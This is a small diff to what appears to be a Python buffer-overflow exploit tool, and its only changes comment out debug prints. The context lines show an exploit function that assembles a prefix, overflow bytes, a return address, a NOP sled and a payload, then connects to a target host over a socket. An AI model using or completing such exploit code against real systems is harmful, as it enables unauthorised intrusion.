@@ -21,7 +21,7 @@ def main(args):
     Main function
     Check which module was used by the user
     """
-    print(args)
+    #print(args)
     argv_len = len( vars(args))
     if argv_len == 0:
         print("Empty input, use -h for more information")
@@ -242,7 +242,7 @@ def exploit(ip,port,prefix,overflow,retn,padding,payload,postfix):
     print(confirm("Starting exploit ..."))
     padding_exploit = "\x90" * padding
     buffer = prefix + overflow + retn + padding_exploit + payload + postfix
-    print(buffer)
+    #print(buffer)
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     try:
         s.connect((ip, int(port)))
